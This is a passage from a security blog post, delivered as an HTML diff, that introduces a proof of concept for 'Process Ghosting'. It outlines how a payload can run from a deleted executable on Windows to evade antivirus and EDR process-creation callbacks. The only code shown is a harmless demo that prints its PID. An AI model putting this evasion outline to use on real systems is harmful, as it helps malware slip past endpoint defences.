@@ -1,0 +1,644 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-us" lang="en-us">
+<head>
+    <script defer language="javascript" type="text/javascript" src="https://whokilleddb.github.io/blogs/js/light_dark.js"></script>
+<script defer language="javascript" type="text/javascript" src="https://whokilleddb.github.io/blogs/js/tabs.js"></script>
+
+
+<script defer language="javascript" type="text/javascript" src="https://whokilleddb.github.io/blogs/js/katex.min.js"></script>
+
+
+<script defer language="javascript" type="text/javascript" src="https://whokilleddb.github.io/blogs/js/auto-render.min.js"></script>
+
+
+<script defer language="javascript" type="text/javascript" src="https://whokilleddb.github.io/blogs/js/katex.js"></script>
+<script defer language="javascript" type="text/javascript" src="https://whokilleddb.github.io/blogs/js/toc.js"></script>
+
+
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+    <meta name="generator" content="Hugo 0.111.3">
+
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <title>Process Ghosting &middot; </title>
+    <meta name="description" content="" />
+
+    
+    <link type="text/css" rel="stylesheet" href="https://whokilleddb.github.io/blogs/css/poole.css">
+<link type="text/css" rel="stylesheet" href="https://whokilleddb.github.io/blogs/css/syntax.css">
+<link type="text/css" rel="stylesheet" href="https://whokilleddb.github.io/blogs/css/hyde.css">
+<link type="text/css" rel="stylesheet" href="https://whokilleddb.github.io/blogs/css/poison.css">
+<link type="text/css" rel="stylesheet" href="https://whokilleddb.github.io/blogs/css/fonts.css">
+<link type="text/css" rel="stylesheet" href="https://whokilleddb.github.io/blogs/css/katex.min.css">
+<link type="text/css" rel="stylesheet" href="https://whokilleddb.github.io/blogs/css/tabs.css">
+
+
+    
+    
+    <style>
+    body {
+        --sidebar-bg-color: #202020;
+        --sidebar-img-border-color: #515151;
+        --sidebar-p-color: #909090;
+        --sidebar-h1-color: #FFF;
+        --sidebar-a-color: #FFF;
+        --sidebar-socials-color: #FFF;
+        --text-color: #222;
+        --bkg-color: #FAF9F6;
+        --post-title-color: #303030;
+        --list-color: #5a5a5a;
+        --link-color: #268bd2;
+        --date-color: #515151;
+        --code-color: #bf616a;
+        --code-background-color: #f9f9f9;
+        --moon-sun-color: #FFF;
+        --moon-sun-background-color: #515151;
+    }
+    body.dark-theme {
+        --text-color: #eee;
+        --bkg-color: #121212;
+        --post-title-color: #DBE2E9;
+        --list-color: #9d9d9d;
+        --link-color: #268bd2;
+        --date-color: #9a9a9a;
+        --code-color: #ff7f7f;
+        --code-background-color: #393D47;
+    }
+    body {
+        background-color: var(--bkg-color);
+    }
+</style>
+
+</head>
+
+    <body class="dark-theme">
+        <aside class="sidebar">
+    <div class="container sidebar-sticky">
+        <div class="light-dark" align="right">
+    <button class="btn-light-dark">
+        <svg class="moon" xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 16 16">
+            <path fill="currentColor" d="M6 .278a.768.768 0 0 1 .08.858a7.208 7.208 0 0 0-.878 3.46c0 4.021 3.278 7.277 7.318 7.277c.527 0 1.04-.055 1.533-.16a.787.787 0 0 1 .81.316a.733.733 0 0 1-.031.893A8.349 8.349 0 0 1 8.344 16C3.734 16 0 12.286 0 7.71C0 4.266 2.114 1.312 5.124.06A.752.752 0 0 1 6 .278z"/>
+        </svg>
+        <svg class="sun" xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 16 16">
+            <path fill="currentColor" d="M8 12a4 4 0 1 0 0-8a4 4 0 0 0 0 8zM8 0a.5.5 0 0 1 .5.5v2a.5.5 0 0 1-1 0v-2A.5.5 0 0 1 8 0zm0 13a.5.5 0 0 1 .5.5v2a.5.5 0 0 1-1 0v-2A.5.5 0 0 1 8 13zm8-5a.5.5 0 0 1-.5.5h-2a.5.5 0 0 1 0-1h2a.5.5 0 0 1 .5.5zM3 8a.5.5 0 0 1-.5.5h-2a.5.5 0 0 1 0-1h2A.5.5 0 0 1 3 8zm10.657-5.657a.5.5 0 0 1 0 .707l-1.414 1.415a.5.5 0 1 1-.707-.708l1.414-1.414a.5.5 0 0 1 .707 0zm-9.193 9.193a.5.5 0 0 1 0 .707L3.05 13.657a.5.5 0 0 1-.707-.707l1.414-1.414a.5.5 0 0 1 .707 0zm9.193 2.121a.5.5 0 0 1-.707 0l-1.414-1.414a.5.5 0 0 1 .707-.707l1.414 1.414a.5.5 0 0 1 0 .707zM4.464 4.465a.5.5 0 0 1-.707 0L2.343 3.05a.5.5 0 1 1 .707-.707l1.414 1.414a.5.5 0 0 1 0 .708z"/>
+        </svg>
+    </button>
+</div>
+
+        <div class="sidebar-about">
+    <h1 class="brand">
+        
+            <a href="https://whokilleddb.github.io/blogs/">
+                <img src="/blogs/images/avatar.png" alt="brand image">
+            </a>
+        
+        
+            <a href="https://whokilleddb.github.io/blogs/">
+                <h1>db&#39;s bl0gs</h1>
+            </a>
+        
+    </h1>
+    <p class="lead">
+    I am Batman
+    </p>
+</div>
+
+        <nav>
+    <ul class="sidebar-nav">
+        
+        
+        
+        
+            
+                
+                    <li class="heading">
+                        <a href="/posts/">Posts</a>
+                    </li>
+                    
+                        <li class="sub-heading">
+                            Recent
+                        </li>
+                        
+                            <li class="bullet">
+                                <a href="https://whokilleddb.github.io/blogs/posts/process-ghosting/">Process Ghosting</a>
+                            </li>
+                        
+                            <li class="bullet">
+                                <a href="https://whokilleddb.github.io/blogs/posts/dotnet-clr-etw/">A gentle guide to the land of .NET, CLR and ETW</a>
+                            </li>
+                        
+                            <li class="bullet">
+                                <a href="https://whokilleddb.github.io/blogs/posts/thm_gallery/">TryHackMe: Gallery</a>
+                            </li>
+                        
+                            <li class="bullet">
+                                <a href="https://whokilleddb.github.io/blogs/posts/thm_dig_dug/">TryHackMe: Dig Dug</a>
+                            </li>
+                        
+                            <li class="bullet">
+                                <a href="https://whokilleddb.github.io/blogs/posts/thm_agentt/">TryHackMe: Agentt</a>
+                            </li>
+                        
+                    
+                
+            
+        
+
+    </ul>
+</nav>
+
+        
+    <a target="_blank" class="social" href="https://github.com/whokilleddb">
+        <svg xmlns="http://www.w3.org/2000/svg" width="1.2em" height="1.2em" viewBox="-2 -2 24 24">
+            <path fill="currentColor" d="M18.88 1.099C18.147.366 17.265 0 16.233 0H3.746C2.714 0 1.832.366 1.099 1.099C.366 1.832 0 2.714 0 3.746v12.487c0 1.032.366 1.914 1.099 2.647c.733.733 1.615 1.099 2.647 1.099H6.66c.19 0 .333-.007.429-.02a.504.504 0 0 0 .286-.169c.095-.1.143-.245.143-.435l-.007-.885c-.004-.564-.006-1.01-.006-1.34l-.3.052c-.19.035-.43.05-.721.046a5.555 5.555 0 0 1-.904-.091a2.026 2.026 0 0 1-.872-.39a1.651 1.651 0 0 1-.572-.8l-.13-.3a3.25 3.25 0 0 0-.41-.663c-.186-.243-.375-.407-.566-.494l-.09-.065a.956.956 0 0 1-.17-.156a.723.723 0 0 1-.117-.182c-.026-.061-.004-.111.065-.15c.07-.04.195-.059.378-.059l.26.04c.173.034.388.138.643.311a2.1 2.1 0 0 1 .631.677c.2.355.44.626.722.813c.282.186.566.28.852.28c.286 0 .533-.022.742-.065a2.59 2.59 0 0 0 .585-.196c.078-.58.29-1.028.637-1.34a8.907 8.907 0 0 1-1.333-.234a5.314 5.314 0 0 1-1.223-.507a3.5 3.5 0 0 1-1.047-.872c-.277-.347-.505-.802-.683-1.365c-.177-.564-.266-1.215-.266-1.952c0-1.049.342-1.942 1.027-2.68c-.32-.788-.29-1.673.091-2.652c.252-.079.625-.02 1.119.175c.494.195.856.362 1.086.5c.23.14.414.257.553.352a9.233 9.233 0 0 1 2.497-.338c.859 0 1.691.113 2.498.338l.494-.312a6.997 6.997 0 0 1 1.197-.572c.46-.174.81-.221 1.054-.143c.39.98.424 1.864.103 2.653c.685.737 1.028 1.63 1.028 2.68c0 .737-.089 1.39-.267 1.957c-.177.568-.407 1.023-.689 1.366a3.65 3.65 0 0 1-1.053.865c-.42.234-.828.403-1.223.507a8.9 8.9 0 0 1-1.333.235c.45.39.676 1.005.676 1.846v3.11c0 .147.021.266.065.357a.36.36 0 0 0 .208.189c.096.034.18.056.254.064c.074.01.18.013.318.013h2.914c1.032 0 1.914-.366 2.647-1.099c.732-.732 1.099-1.615 1.099-2.647V3.746c0-1.032-.367-1.914-1.1-2.647z"/>
+        </svg>
+    </a>
+
+
+    <a target="_blank" class="social" href="https://linkedin.com/whokilleddb">
+        <svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1.2em" viewBox="0 0 448 512">
+            <path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5c0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7c-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5c67.2 0 79.7 44.3 79.7 101.9V416z"/>
+        </svg>
+    </a>
+
+
+    <a target="_blank" class="social" href="https://twitter.com/whokilleddb">
+        <svg xmlns="http://www.w3.org/2000/svg" width="1.2em" height="1.2em" viewBox="0 0 16 16">
+            <path fill="currentColor" d="M5.032 14.286c6.037 0 9.34-4.837 9.34-9.032c0-.137 0-.274-.01-.41A6.56 6.56 0 0 0 16 3.2c-.6.256-1.235.425-1.885.5a3.207 3.207 0 0 0 1.443-1.757c-.645.37-1.35.63-2.085.77a3.322 3.322 0 0 0-1.862-.958a3.384 3.384 0 0 0-2.082.334a3.223 3.223 0 0 0-1.442 1.49a3.08 3.08 0 0 0-.208 2.03a9.57 9.57 0 0 1-3.747-.963a9.269 9.269 0 0 1-3.018-2.354a3.086 3.086 0 0 0-.36 2.314c.189.787.68 1.475 1.376 1.924a3.344 3.344 0 0 1-1.49-.398v.04c0 .734.263 1.444.743 2.01a3.3 3.3 0 0 0 1.89 1.102c-.483.128-.99.146-1.482.055a3.19 3.19 0 0 0 1.168 1.577a3.36 3.36 0 0 0 1.9.627A6.732 6.732 0 0 1 0 12.86a9.527 9.527 0 0 0 5.032 1.423"/>
+        </svg>
+    </a>
+
+
+
+    <a target="_blank" class="social" href="https://tryhackme.com/">
+        <svg xmlns="http://www.w3.org/2000/svg" width="1.2em" height="1.2em" viewBox="0 0 24 24" >
+            <path fill="white" d="M10.705 0C7.54 0 4.902 2.285 4.349 5.291a4.525 4.525 0 0 0-4.107 4.5 4.525 4.525 0 0 0 4.52 4.52h6.761a.625.625 0 1 0 0-1.25H4.761a3.273 3.273 0 0 1-3.27-3.27A3.273 3.273 0 0 1 6.59 7.08a.625.625 0 0 0 .7-1.035 4.488 4.488 0 0 0-1.68-.69 5.223 5.223 0 0 1 5.096-4.104 5.221 5.221 0 0 1 5.174 4.57 4.489 4.489 0 0 0-.488.305.625.625 0 1 0 .731 1.013 3.245 3.245 0 0 1 1.912-.616 3.278 3.278 0 0 1 3.203 2.61.625.625 0 0 0 1.225-.251 4.533 4.533 0 0 0-4.428-3.61 4.54 4.54 0 0 0-.958.105C16.556 2.328 13.9 0 10.705 0zm5.192 10.64a.925.925 0 0 0-.462.108.913.913 0 0 0-.313.29 1.27 1.27 0 0 0-.175.427 2.39 2.39 0 0 0-.054.514c0 .181.018.353.054.517.036.164.095.307.175.43a.899.899 0 0 0 .313.297c.127.073.281.11.462.11.18 0 .334-.037.46-.11a.897.897 0 0 0 .309-.296c.08-.124.137-.267.173-.431.036-.164.054-.336.054-.517 0-.18-.018-.352-.054-.514a1.271 1.271 0 0 0-.173-.426.901.901 0 0 0-.309-.291.917.917 0 0 0-.46-.108zm6.486 0a.925.925 0 0 0-.462.108.913.913 0 0 0-.313.29 1.27 1.27 0 0 0-.175.427 2.39 2.39 0 0 0-.053.514c0 .181.017.353.053.517.036.164.095.307.175.43a.899.899 0 0 0 .313.297c.127.073.281.11.462.11.18 0 .334-.037.46-.11a.897.897 0 0 0 .31-.296c.078-.124.136-.267.172-.431.036-.164.054-.336.054-.517 0-.18-.018-.352-.054-.514a1.271 1.271 0 0 0-.173-.426.901.901 0 0 0-.308-.291.916.916 0 0 0-.461-.108zm-8.537.068l-.84.618.313.43.476-.368v1.877h.603v-2.557zm6.486 0l-.841.618.314.43.477-.368v1.877h.603v-2.557zm-4.435.445c.08 0 .143.028.193.084.05.057.087.127.114.21.026.083.044.173.054.269a2.541 2.541 0 0 1 0 .533c-.01.097-.028.187-.054.27a.584.584 0 0 1-.114.21.243.243 0 0 1-.193.085.248.248 0 0 1-.195-.086.584.584 0 0 1-.118-.209 1.245 1.245 0 0 1-.056-.27 2.645 2.645 0 0 1 0-.533c.01-.096.029-.186.056-.27a.583.583 0 0 1 .118-.209.25.25 0 0 1 .195-.084zm6.486 0c.08 0 .144.028.193.084.05.057.087.127.114.21.027.083.044.173.054.269a2.541 2.541 0 0 1 0 .533c-.01.097-.027.187-.054.27a.584.584 0 0 1-.114.21.243.243 0 0 1-.193.085.249.249 0 0 1-.195-.086.581.581 0 0 1-.117-.209 1.245 1.245 0 0 1-.056-.27 2.642 2.642 0 0 1 0-.533c.01-.096.028-.186.056-.27a.58.58 0 0 1 .117-.209.25.25 0 0 1 .195-.084zm-2.191 3.51a.93.93 0 0 0-.463.109.908.908 0 0 0-.312.291c-.08.122-.139.263-.175.426a2.383 2.383 0 0 0-.054.514c0 .18.018.353.054.516.036.164.094.308.175.432a.91.91 0 0 0 .312.296.92.92 0 0 0 .463.11c.18 0 .333-.037.46-.11a.892.892 0 0 0 .308-.296 1.32 1.32 0 0 0 .174-.432c.036-.163.054-.335.054-.516 0-.18-.018-.352-.054-.514a1.274 1.274 0 0 0-.174-.426.89.89 0 0 0-.309-.291.918.918 0 0 0-.46-.108zm-6.402.07l-.841.617.314.43.476-.369v1.878h.604v-2.557zm2.125 0l-.841.617.314.43.477-.369v1.878h.603v-2.557zm2.116 0l-.84.617.313.43.477-.369v1.878h.603v-2.557zm2.16.443c.08 0 .144.028.194.085a.605.605 0 0 1 .114.21c.026.083.044.172.053.269a2.639 2.639 0 0 1 0 .532 1.28 1.28 0 0 1-.053.27.585.585 0 0 1-.114.21.244.244 0 0 1-.193.085.25.25 0 0 1-.196-.085.589.589 0 0 1-.117-.21 1.245 1.245 0 0 1-.056-.27 2.597 2.597 0 0 1 0-.532c.01-.097.028-.186.056-.27a.589.589 0 0 1 .117-.209.249.249 0 0 1 .196-.085zm-6.729 3.073a.676.676 0 0 0-.335.078.661.661 0 0 0-.227.211.91.91 0 0 0-.127.31c-.027.118-.04.242-.04.373s.013.256.04.375a.93.93 0 0 0 .127.313.65.65 0 0 0 .227.215c.092.053.204.08.335.08a.655.655 0 0 0 .334-.08.65.65 0 0 0 .225-.215c.057-.09.1-.194.125-.313a1.75 1.75 0 0 0 .04-.375c0-.13-.014-.255-.04-.373a.931.931 0 0 0-.125-.31.658.658 0 0 0-.225-.21.667.667 0 0 0-.334-.08zm3.086 0a.675.675 0 0 0-.336.078.661.661 0 0 0-.226.211.907.907 0 0 0-.127.31 1.69 1.69 0 0 0-.04.373c0 .131.013.256.04.375a.928.928 0 0 0 .127.313c.058.09.134.162.226.215.093.053.205.08.336.08a.655.655 0 0 0 .334-.08.65.65 0 0 0 .224-.215c.058-.09.1-.194.126-.313a1.752 1.752 0 0 0 0-.748.94.94 0 0 0-.126-.31.657.657 0 0 0-.224-.21.667.667 0 0 0-.334-.08zm5.108 0a.675.675 0 0 0-.336.078.661.661 0 0 0-.226.211.91.91 0 0 0-.127.31c-.027.118-.04.242-.04.373s.013.256.04.375a.931.931 0 0 0 .127.313c.058.09.134.162.226.215.093.053.205.08.336.08.13 0 .243-.027.334-.08a.65.65 0 0 0 .224-.215c.058-.09.1-.194.126-.313a1.75 1.75 0 0 0 .04-.375c0-.13-.014-.255-.04-.373a.943.943 0 0 0-.126-.31.657.657 0 0 0-.224-.21.668.668 0 0 0-.334-.08zm-6.658.05l-.61.448.227.311.346-.266v1.362h.438v-1.856zm3.068 0l-.61.448.227.311.346-.266v1.362h.438v-1.856zm5.108 0l-.611.448.228.311.346-.266v1.362h.438v-1.856zm-9.712.322c.058 0 .105.02.14.062a.421.421 0 0 1 .083.151.96.96 0 0 1 .04.196 1.932 1.932 0 0 1 0 .386.954.954 0 0 1-.04.197.421.421 0 0 1-.083.152.176.176 0 0 1-.14.061.18.18 0 0 1-.141-.06.427.427 0 0 1-.085-.153.887.887 0 0 1-.041-.197 1.96 1.96 0 0 1 0-.386.893.893 0 0 1 .04-.196.42.42 0 0 1 .086-.151.181.181 0 0 1 .141-.062zm3.086 0c.058 0 .104.02.14.062a.421.421 0 0 1 .082.151.94.94 0 0 1 .04.196 1.906 1.906 0 0 1 0 .386.93.93 0 0 1-.04.197.421.421 0 0 1-.082.152.176.176 0 0 1-.14.061.18.18 0 0 1-.141-.06.42.42 0 0 1-.086-.153.846.846 0 0 1-.04-.197 1.965 1.965 0 0 1-.011-.195c0-.057.004-.121.01-.191a.849.849 0 0 1 .041-.196.42.42 0 0 1 .086-.151.182.182 0 0 1 .141-.062zm5.108 0c.058 0 .104.02.14.062a.421.421 0 0 1 .082.151.92.92 0 0 1 .04.196 1.963 1.963 0 0 1 0 .386.943.943 0 0 1-.04.197.421.421 0 0 1-.082.152.177.177 0 0 1-.14.061.18.18 0 0 1-.142-.06.437.437 0 0 1-.085-.153.95.95 0 0 1-.04-.197 1.965 1.965 0 0 1-.011-.195c0-.057.004-.121.01-.191a.959.959 0 0 1 .04-.196.47.47 0 0 1 .086-.151.181.181 0 0 1 .142-.062zm-1.684 1.814a.675.675 0 0 0-.336.079.66.66 0 0 0-.227.21.91.91 0 0 0-.127.31 1.731 1.731 0 0 0 0 .748.939.939 0 0 0 .127.314c.059.09.134.162.227.215.093.053.205.08.336.08a.66.66 0 0 0 .334-.08.648.648 0 0 0 .224-.215c.058-.09.1-.195.126-.314a1.737 1.737 0 0 0-.001-.747.928.928 0 0 0-.125-.31.65.65 0 0 0-.224-.211.668.668 0 0 0-.334-.079zm3.063 0a.676.676 0 0 0-.336.079.664.664 0 0 0-.227.21.906.906 0 0 0-.127.31 1.74 1.74 0 0 0 0 .748.936.936 0 0 0 .127.314.66.66 0 0 0 .227.215c.092.053.204.08.336.08a.654.654 0 0 0 .334-.08.648.648 0 0 0 .223-.215c.058-.09.1-.195.126-.314a1.74 1.74 0 0 0 0-.747.928.928 0 0 0-.126-.31.65.65 0 0 0-.223-.211.666.666 0 0 0-.334-.079zm-1.545.05l-.611.448.228.312.346-.267v1.363h.438v-1.856zm-1.518.323c.057 0 .104.02.14.061a.42.42 0 0 1 .082.152.91.91 0 0 1 .04.195 1.966 1.966 0 0 1 0 .387.951.951 0 0 1-.04.197.421.421 0 0 1-.082.152.177.177 0 0 1-.14.06.18.18 0 0 1-.142-.06.428.428 0 0 1-.085-.152.914.914 0 0 1-.04-.197 1.96 1.96 0 0 1-.011-.195c0-.058.003-.122.01-.192a.923.923 0 0 1 .041-.195c.02-.06.048-.11.085-.152a.181.181 0 0 1 .142-.061zm3.063 0c.057 0 .104.02.14.061a.42.42 0 0 1 .082.152.94.94 0 0 1 .04.195 1.91 1.91 0 0 1 0 .387.93.93 0 0 1-.04.197.422.422 0 0 1-.083.152.175.175 0 0 1-.14.06.18.18 0 0 1-.141-.06.423.423 0 0 1-.085-.152.907.907 0 0 1-.04-.197 1.95 1.95 0 0 1 0-.387.915.915 0 0 1 .04-.195c.02-.06.048-.11.085-.152a.182.182 0 0 1 .142-.061zm-9.713.185a.465.465 0 0 0-.232.055.456.456 0 0 0-.157.146.627.627 0 0 0-.089.215 1.168 1.168 0 0 0-.027.259c0 .09.009.177.027.26a.648.648 0 0 0 .089.216c.04.063.093.112.157.149a.459.459 0 0 0 .232.056c.09 0 .168-.02.231-.056a.45.45 0 0 0 .156-.149.67.67 0 0 0 .087-.217 1.218 1.218 0 0 0 0-.518.647.647 0 0 0-.087-.215.448.448 0 0 0-.156-.146.458.458 0 0 0-.23-.055zm1.052.035l-.423.31.158.217.24-.185v.944h.303v-1.286zm-1.052.224c.04 0 .073.014.097.042a.284.284 0 0 1 .057.105.69.69 0 0 1 .028.136c.004.049.007.092.007.133 0 .04-.003.086-.007.135a.684.684 0 0 1-.028.136.285.285 0 0 1-.057.105.123.123 0 0 1-.097.043.125.125 0 0 1-.098-.043.298.298 0 0 1-.059-.105.612.612 0 0 1-.028-.136 1.39 1.39 0 0 1 0-.268.62.62 0 0 1 .028-.136.297.297 0 0 1 .06-.105.125.125 0 0 1 .097-.042zm3.775 1.394a.463.463 0 0 0-.232.054.452.452 0 0 0-.157.146.621.621 0 0 0-.088.214 1.19 1.19 0 0 0 0 .519.641.641 0 0 0 .088.217.46.46 0 0 0 .157.15.458.458 0 0 0 .232.054.454.454 0 0 0 .232-.055.45.45 0 0 0 .155-.149.664.664 0 0 0 .087-.217 1.189 1.189 0 0 0 0-.519.642.642 0 0 0-.087-.214.446.446 0 0 0-.155-.146.459.459 0 0 0-.232-.054zm1.052.034l-.423.31.158.216.24-.185v.945h.303V22.68zm-1.052.223c.04 0 .073.014.098.043a.3.3 0 0 1 .057.105.643.643 0 0 1 .027.135 1.31 1.31 0 0 1 0 .268.654.654 0 0 1-.027.137.307.307 0 0 1-.057.105.124.124 0 0 1-.098.042.125.125 0 0 1-.098-.042.293.293 0 0 1-.059-.105.618.618 0 0 1-.028-.137 1.364 1.364 0 0 1 0-.268.612.612 0 0 1 .028-.135.287.287 0 0 1 .06-.105.123.123 0 0 1 .097-.043z"></path>
+        </svg>
+    </a>
+
+
+
+
+    <a target="_blank" class="social" href="https://instagram.com/whokilleddb">
+        <svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1.2em" viewBox="0 0 448 512">
+            <path fill="currentColor" d="M224.1 141c-63.6 0-114.9 51.3-114.9 114.9s51.3 114.9 114.9 114.9S339 319.5 339 255.9S287.7 141 224.1 141zm0 189.6c-41.1 0-74.7-33.5-74.7-74.7s33.5-74.7 74.7-74.7s74.7 33.5 74.7 74.7s-33.6 74.7-74.7 74.7zm146.4-194.3c0 14.9-12 26.8-26.8 26.8c-14.9 0-26.8-12-26.8-26.8s12-26.8 26.8-26.8s26.8 12 26.8 26.8zm76.1 27.2c-1.7-35.9-9.9-67.7-36.2-93.9c-26.2-26.2-58-34.4-93.9-36.2c-37-2.1-147.9-2.1-184.9 0c-35.8 1.7-67.6 9.9-93.9 36.1s-34.4 58-36.2 93.9c-2.1 37-2.1 147.9 0 184.9c1.7 35.9 9.9 67.7 36.2 93.9s58 34.4 93.9 36.2c37 2.1 147.9 2.1 184.9 0c35.9-1.7 67.7-9.9 93.9-36.2c26.2-26.2 34.4-58 36.2-93.9c2.1-37 2.1-147.8 0-184.8zM398.8 388c-7.8 19.6-22.9 34.7-42.6 42.6c-29.5 11.7-99.5 9-132.1 9s-102.7 2.6-132.1-9c-19.6-7.8-34.7-22.9-42.6-42.6c-11.7-29.5-9-99.5-9-132.1s-2.6-102.7 9-132.1c7.8-19.6 22.9-34.7 42.6-42.6c29.5-11.7 99.5-9 132.1-9s102.7-2.6 132.1 9c19.6 7.8 34.7 22.9 42.6 42.6c11.7 29.5 9 99.5 9 132.1s2.7 102.7-9 132.1z"/>
+        </svg>
+    </a>
+
+
+
+        <p class="footnote">
+powered by <a target="_blank" href="https://gohugo.io">Hugo</a> | themed with <a target="_blank" href="https://github.com/lukeorth/poison">poison</a>
+    <br>
+    &copy; 2023 . All rights reserved.
+</p>
+
+  </div>
+</aside>
+
+        <main class="content container">
+            <div class="post">
+  <div class="info">
+    <h1 class="post-title">
+        <a href="https://whokilleddb.github.io/blogs/posts/process-ghosting/">Process Ghosting</a>
+    </h1>
+    <time datetime="2023-04-05T14:59:22&#43;0530" class="post-date">
+        April 5, 2023
+    </time>
+    
+    
+    
+    
+    
+    
+</div>
+
+  <h1 id="ghosted---a-poc-on-process-ghosting">Ghosted - A PoC on Process Ghosting</h1>
+<blockquote>
+<p>&ldquo;Ghost Processes Not People&rdquo;</p>
+</blockquote>
+<p><img src="https://inspiredbusinessconcepts.com/wp-content/uploads/2022/10/ghosting.jpg" alt=""></p>
+<h2 id="introduction">Introduction</h2>
+<p><code>Process Ghosting</code> is a technique of running payloads from an executable that has already been deleted. On Windows. it is possible to create a file, put it in a delete pending stage, write your payload to it, map it to an image section for it, close the file handle to delete the file, and then finally create a process from the mapped image section. This, essentially, is the <code>Process Ghosting</code> process.  In this way, the created process does not have an associated executable file on disk which makes detection difficult for certain EDRs/AV engines.</p>
+<h2 id="processes-spawned-up-callbacks-get-thrown-up-httpswwwyoutubecomshortsxo5gytho6hi">Processes Spawned Up, Callbacks Get Thrown Up <a href="https://www.youtube.com/shorts/XO5gYTHo6HI">🎵</a></h2>
+<p>An interesting question to ask is how do Security vendors scan processes? One of the methods, <a href="https://www.microsoft.com/en-us/security/blog/2022/06/30/using-process-creation-properties-to-catch-evasion-techniques/">as described by Microsoft in this post</a>, goes as follows:</p>
+<blockquote>
+<p>Process creation callbacks in the kernel, such as those provided by the <a href="https://docs.microsoft.com/windows-hardware/drivers/ddi/ntddk/nf-ntddk-pssetcreateprocessnotifyroutineex"><em>PsSetCreateProcessNotifyRoutineEx</em></a> API, is the functionality in the operating system that allows antimalware engines to inspect a process while it’s being created. It can intercept the creation of a process and perform a scan on the relevant executable, all before the process runs.</p>
+</blockquote>
+<p>However, there is a catch. Looking at the documentation for <a href="https://docs.microsoft.com/windows-hardware/drivers/ddi/ntddk/nf-ntddk-pssetcreateprocessnotifyroutineex"><code>PsSetCreateProcessNotifyRoutineEx</code></a>, notice the following part:</p>
+<blockquote>
+<p>When a process is created, the process-notify routine runs in the context of the thread that created the new process. When a process is deleted, the process-notify routine runs in the context of the last thread to exit from the process.</p>
+</blockquote>
+<p>This means that callbacks are registered only when the first thread is spawned, which gives malware a window between the time of creation and the time at which security vendors are notified about it. It is in this interval that malware can carry out image tampering leading to attacks like <code>Process Doppelgänging</code>, <code>Process Herpaderping</code>, and <code>Process Ghosting</code>.</p>
+<h2 id="processes-vs-exes">Processes vs Exes</h2>
+<p>First, let us write a demo application that we will use to demonstrate certain artifacts throughout:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">// demo.c
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;windows.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>() {
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Hello From PID: %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#a6e22e">GetCurrentProcessId</span>());
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">getchar</span>();
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Compiling and running this program outputs the process&rsquo;s PID. Running the process and inspecting its properties in <em>Process Hacker2</em> shows the following:</p>
+<p><img src="/blogs/images/process-ghosting/demo_in_ph2.png" alt=""></p>
+<p>Notice how the <code>demo.exe</code> executable is listed as the <code>Image File name</code> for the process? However, one can delete the executable and the process would still be live. Quoting Gabriel Landau here:</p>
+<blockquote>
+<p>It’s important to note that processes are not executables, and executables are not processes.</p>
+</blockquote>
+<p>This <a href="https://fourcore.io/blogs/how-a-windows-process-is-created-part-2">blog</a> does a good job of explaining the process creation flow carried out by <a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa">CreateProcess()</a> to launch a process on Windows. Long story short, Windows uses function calls like <code>NtCreateUserProcess()</code> to launch a process, but the individual API components can also be called to launch a process.</p>
+<p>The steps to launch a process from an executable can be summarized as such:</p>
+<ul>
+<li>Open an Executable file and get a handle to it</li>
+<li>Create an <code>Image Section</code> for the file and map the appropriate memory</li>
+<li>Create a Process out of the mapped section</li>
+<li>Assign appropriate environment variables and process arguments</li>
+<li>Create a Thread to execute the process</li>
+</ul>
+<p>Again, quoting  Gabriel Landau:</p>
+<blockquote>
+<p>Processes are launched from executables, but some of the data within the executable file is modified as it is mapped into a process. To account for these modifications, the Windows memory manager caches image sections at the time of their creation. <strong>This means that image sections can deviate from their executable files.</strong></p>
+</blockquote>
+<p>Windows provides APIs like <a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-pssetcreatethreadnotifyroutineex">PsSetCreateProcessNotifyRoutineEx</a> and <a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-pssetcreateprocessnotifyroutineex">PsSetCreateThreadNotifyRoutineEx</a> to receive callbacks upon creation of processes and threads. Security vendors can register callbacks using these functions and monitor processes/threads.</p>
